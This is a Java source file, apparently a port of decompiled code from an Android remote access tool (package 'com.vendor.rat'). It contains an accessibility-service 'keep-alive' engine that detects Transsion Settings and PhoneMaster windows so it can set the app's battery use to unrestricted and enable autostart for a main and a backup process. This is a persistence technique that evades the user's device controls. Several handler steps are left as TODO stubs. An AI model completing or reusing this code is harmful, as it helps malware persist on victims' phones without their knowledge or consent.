package com.vendor.rat.auto.engine;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.vendor.rat.auto.condition.CombineFilter;
import com.vendor.rat.auto.condition.StringCondition;
import com.vendor.rat.auto.entity.UiNode;
import com.vendor.rat.config.TextConfig;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * Transsion (传音) 保活引擎
 *
 * Vendor: o/e0.java (373 行)
 * 功能: 在 Transsion 设备 (Tecno/Infinix/itel) 上自动设置:
 *       1. 应用电量管理 → 不受限
 *       2. 自启动管理 → 勾选主进程 + 备用进程
 *       支持 com.transsion.phonemaster 自启动管理
 *
 * 字段对齐:
 *   f626y → SYNTHETIC_FLAG (static)
 *   f627r → keepAliveTarget (AtomicReference)
 *   f628s → mainAutoStart (AtomicBoolean)
 *   f629t → backupAutoStart (AtomicBoolean)
 *   f630u → mainRelateStart (AtomicBoolean, 默认 true)
 *   f631v → backupRelateStart (AtomicBoolean, 默认 true)
 *   f632w → mainFullBackground (AtomicBoolean)
 *   f633x → backupFullBackground (AtomicBoolean)
 *
 * 方法对齐:
 *   b0() → createBatteryTextFilter()
 *   c0() → createSubSettingsWindow()
 *   d0(str) → createAppDetailWindow(str)
 *   e0(str) → createTranssionAppInfoWindow(str)
 *   f0() → createPowerTextFilter()
 *   g0() → createUsePowerTextFilter()
 *   h0() → createAutoStartFrameWindow()
 *   i0() → createAutoStartActivityWindow()
 *   m0(str) → createFrameLayoutWindow(str)
 *   n0() → createAllListenWindows()
 *   q0() → createUnrestrictedFilters()
 *   Z()  → finish()
 *   j0() → isInBatteryManageWindow()
 *   k0() → isInAppDetailWindow()
 *   l0() → isInAutoStartWindow()
 *   o0(root) → findBatteryItem(root) [反编译失败]
 *   p0() → savePowerControlState()
 *   u()  → onAccessibilityEvent()
 */
public class TranssionKeepAliveEngine extends AutoEngine {

    private static final String TAG = "TranssionKeepAlive";

    private static final String SETTINGS = "com.android.settings";
    private static final String PHONE_MASTER = "com.transsion.phonemaster";

    // ADAPT: f626y → 静态合成字段
    public static final int SYNTHETIC_FLAG = 0;

    // ADAPT: f627r → keepAliveTarget
    public final AtomicReference<AospKeepAliveEngine.KeepAliveTarget> keepAliveTarget;

    // ADAPT: f628s → mainAutoStart
    public final AtomicBoolean mainAutoStart;

    // ADAPT: f629t → backupAutoStart
    public final AtomicBoolean backupAutoStart;

    // ADAPT: f630u → mainRelateStart (默认 true)
    public final AtomicBoolean mainRelateStart;

    // ADAPT: f631v → backupRelateStart (默认 true)
    public final AtomicBoolean backupRelateStart;

    // ADAPT: f632w → mainFullBackground
    public final AtomicBoolean mainFullBackground;

    // ADAPT: f633x → backupFullBackground
    public final AtomicBoolean backupFullBackground;

    public TranssionKeepAliveEngine() {
        super(createAllListenWindows(), SETTINGS);
        this.keepAliveTarget = new AtomicReference<>(AospKeepAliveEngine.KeepAliveTarget.KEEP_ALIVE_UNKNOWN);
        this.mainAutoStart = new AtomicBoolean(false);
        this.backupAutoStart = new AtomicBoolean(false);
        this.mainRelateStart = new AtomicBoolean(true);
        this.backupRelateStart = new AtomicBoolean(true);
        this.mainFullBackground = new AtomicBoolean(false);
        this.backupFullBackground = new AtomicBoolean(false);
        try {
            // ADAPT: vendor 60 秒超时自动结束
            scheduler.schedule(() -> finish(), 60L, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "schedule timeout failed", e);
        }
    }

    @Override
    public void execute() {
        // ADAPT: vendor 无独立 execute
    }

    @Override
    public void onWindowMatched(String packageName, String className, AccessibilityEvent event) {
        try {
            if (isFinished()) return;

            boolean inAppDetail = isInAppDetailWindow();
            if (inAppDetail) {
                stateQueue.remove("keepAliveInAppBattery");
                stateQueue.remove("keepAliveInAutoStart");
                if (!stateQueue.contains("keepAliveInAppDetail")) {
                    stateQueue.add("keepAliveInAppDetail");
                    // ADAPT: com.guard.wallet.thread.l.c(new d0(this, 0), str3)
                    // TODO: VENDOR_VERIFY - 应用详情处理
                }
            }
            if (isInBatteryManageWindow()) {
                stateQueue.remove("keepAliveInAppDetail");
                stateQueue.remove("keepAliveInAutoStart");
                if (!stateQueue.contains("keepAliveInAppBattery")) {
                    stateQueue.add("keepAliveInAppBattery");
                    // ADAPT: com.guard.wallet.thread.l.c(new d0(this, 1), str3)
                    // TODO: VENDOR_VERIFY - 电量管理处理
                }
            }
            if (isInAutoStartWindow()) {
                stateQueue.remove("keepAliveInAppDetail");
                stateQueue.remove("keepAliveInAppBattery");
                if (!stateQueue.contains("keepAliveInAutoStart")) {
                    stateQueue.add("keepAliveInAutoStart");
                    // ADAPT: com.guard.wallet.thread.l.c(new d0(this, 2), str3)
                    // TODO: VENDOR_VERIFY - 自启动管理处理
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "onWindowMatched", e);
        }
    }

    // ============ 窗口匹配器 ============

    /**
     * ADAPT: c0() → SubSettings 窗口
     */
    public static WindowMatcher createSubSettingsWindow() {
        return new WindowMatcher(SETTINGS, "com.android.settings.SubSettings")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: d0(str) → 应用详情窗口
     */
    public static WindowMatcher createAppDetailWindow(String appLabel) {
        return new WindowMatcher(SETTINGS,
                "com.android.settings.applications.InstalledAppDetailsTop")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: e0(str) → Transsion 应用信息窗口
     */
    public static WindowMatcher createTranssionAppInfoWindow(String appLabel) {
        return new WindowMatcher(SETTINGS,
                "com.transsion.settings.applications.appinfo.AppInfoSettings")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: h0() → 自启动管理 FrameLayout 窗口
     */
    public static WindowMatcher createAutoStartFrameWindow() {
        return new WindowMatcher(PHONE_MASTER, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: i0() → 自启动管理 Activity 窗口
     */
    public static WindowMatcher createAutoStartActivityWindow() {
        return new WindowMatcher(PHONE_MASTER,
                "com.cyin.himgr.autostart.AutoStartActivity")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: m0(str) → FrameLayout 窗口
     */
    public static WindowMatcher createFrameLayoutWindow(String appLabel) {
        return new WindowMatcher(SETTINGS, "android.widget.FrameLayout")
                .addEventType(32).addEventType(16384);
    }

    /**
     * ADAPT: n0() → 创建所有监听窗口
     */
    public static List<WindowMatcher> createAllListenWindows() {
        List<WindowMatcher> list = new ArrayList<>();
        // ADAPT: vendor 使用 c.J() (电池优化对话框)
        list.add(createAutoStartActivityWindow());
        list.add(createAutoStartFrameWindow());
        list.add(createAppDetailWindow(null));
        list.add(createTranssionAppInfoWindow(null));
        list.add(createFrameLayoutWindow(null));
        list.add(createSubSettingsWindow());
        return list;
    }

    // ============ 过滤器 ============

    /**
     * ADAPT: b0() → 电池文本过滤器
     */
    public static CombineFilter createBatteryTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_BATTERY_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: f0() → 电量文本过滤器
     */
    public static CombineFilter createPowerTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_POWER_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: g0() → 耗电文本过滤器
     */
    public static CombineFilter createUsePowerTextFilter() {
        String text = TextConfig.getInstance().getFirst("COMMON_SETTINGS_USE_POWER_TEXT");
        if (text == null || text.isEmpty()) return null;
        return CombineFilter.textView(text);
    }

    /**
     * ADAPT: q0() → 不受限文本过滤器 (OR 组合)
     */
    public static CombineFilter createUnrestrictedFilters() {
        return AospKeepAliveEngine.createUnrestrictedFilters();
    }

    // ============ 窗口检测 ============

    /**
     * ADAPT: j0() → 是否在电量管理窗口
     */
    public final boolean isInBatteryManageWindow() {
        try {
            return matchWindow(SETTINGS, "com.android.settings.SubSettings");
        } catch (Exception e) {
            Log.e(TAG, "isInBatteryManageWindow", e);
            return false;
        }
    }

    /**
     * ADAPT: k0() → 是否在应用详情窗口
     */
    public final boolean isInAppDetailWindow() {
        try {
            return matchWindow(SETTINGS, "com.android.settings.applications.InstalledAppDetailsTop")
                    || matchWindow(SETTINGS, "com.transsion.settings.applications.appinfo.AppInfoSettings")
                    || matchWindow(SETTINGS, "android.widget.FrameLayout");
        } catch (Exception e) {
            Log.e(TAG, "isInAppDetailWindow", e);
            return false;
        }
    }

    /**
     * ADAPT: l0() → 是否在自启动管理窗口
     */
    public final boolean isInAutoStartWindow() {
        try {
            return matchWindow(PHONE_MASTER, "com.cyin.himgr.autostart.AutoStartActivity")
                    || matchWindow(PHONE_MASTER, "android.widget.FrameLayout");
        } catch (Exception e) {
            Log.e(TAG, "isInAutoStartWindow", e);
            return false;
        }
    }

    /**
     * ADAPT: p0() → 保存保活策略 (主进程 + 备用进程)
     */
    public final void savePowerControlState() {
        try {
            // TODO: VENDOR_VERIFY - 需要 PowerControlStateVO + utils.h 集成
            Log.d(TAG, "主进程保活策略已保存");
            Log.d(TAG, "备用进程保活策略已保存");
        } catch (Exception e) {
            Log.e(TAG, "savePowerControlState", e);
        }
    }

    /**
     * ADAPT: Z() → 结束引擎
     */
    public void finish() {
        if (lock.tryLock()) {
            try {
                if (!isFinished()) {
                    Log.d(TAG, "准备结束本地保活自动化引擎");
                    savePowerControlState();
                    scheduler.shutdownNow();
                    stateQueue.clear();
                    Log.d(TAG, "已结束本地保活自动化引擎");
                }
            } catch (Exception e) {
                Log.e(TAG, "finish", e);
            } finally {
                lock.unlock();
            }
        }
    }
}
